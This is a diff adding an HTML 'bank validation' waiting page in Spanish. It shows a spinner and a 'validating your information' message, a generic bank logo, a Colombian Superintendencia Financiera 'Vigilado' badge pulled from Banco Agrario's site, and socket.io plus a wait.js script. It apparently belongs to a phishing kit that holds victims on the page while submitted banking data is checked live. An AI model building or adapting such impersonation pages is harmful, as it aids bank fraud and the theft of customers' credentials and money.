@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Página de espera para validación bancaria"
+    />
+    <script src="../../../js/functions.js"></script>
+    <title>Validación Bancaria</title>
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon" />
+    <style>
+      :root {
+        --color-primary: #000;
+        --color-secondary: #2b3035;
+        --spacing-standard: 10px;
+        --border-radius: 20px;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: system-ui, -apple-system, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      header {
+        height: 10vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: #fff;
+        border-radius: 0 0 var(--border-radius) var(--border-radius);
+        padding: var(--spacing-standard) 0;
+      }
+
+      .main-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 2rem;
+        padding: 0 1rem;
+        text-align: center;
+      }
+
+      h1 {
+        font-size: clamp(1.5rem, 4vw, 2rem);
+        color: var(--color-secondary);
+      }
+
+      footer {
+        height: 10vh;
+        display: flex;
+        align-items: center;
+        justify-content: space-around;
+        background-color: var(--color-secondary);
+        border-radius: var(--border-radius) var(--border-radius) 0 0;
+        padding: var(--spacing-standard) 0;
+      }
+
+      .logo {
+        height: 80%;
+        width: auto;
+      }
+
+      .superintendencia-logo {
+        width: 40%;
+        max-width: 200px;
+        height: auto;
+      }
+
+      .loader {
+        width: 80px;
+        height: 80px;
+        border: 8px solid var(--color-primary);
+        border-bottom-color: transparent;
+        border-radius: 50%;
+        display: inline-block;
+        animation: rotation 1s linear infinite;
+      }
+
+      @keyframes rotation {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 576px) {
+        footer {
+          flex-direction: column;
+          height: auto;
+        }
+        .logo {
+          height: auto;
+          width: 25%;
+        }
+
+        .superintendencia-logo {
+          width: 60%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <img
+        class="logo"
+        src="img/logo-big.svg"
+        alt="Logo del Banco"
+        loading="eager"
+      />
+    </header>
+
+    <main class="main-content">
+      <div class="loader" role="status"></div>
+      <h1>Estamos validando la información ingresada, espere un momento.</h1>
+    </main>
+
+    <footer>
+      <img
+        class="logo"
+        src="img/logo-big.svg"
+        alt="Logo del Banco"
+        loading="lazy"
+      />
+      <img
+        class="superintendencia-logo"
+        src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.bancoagrario.gov.co%2Fsites%2Fdefault%2Ffiles%2Finline-images%2Fvigilado_0.png"
+        alt="Vigilado por Superintendencia Financiera de Colombia"
+        loading="lazy"
+      />
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+</html>
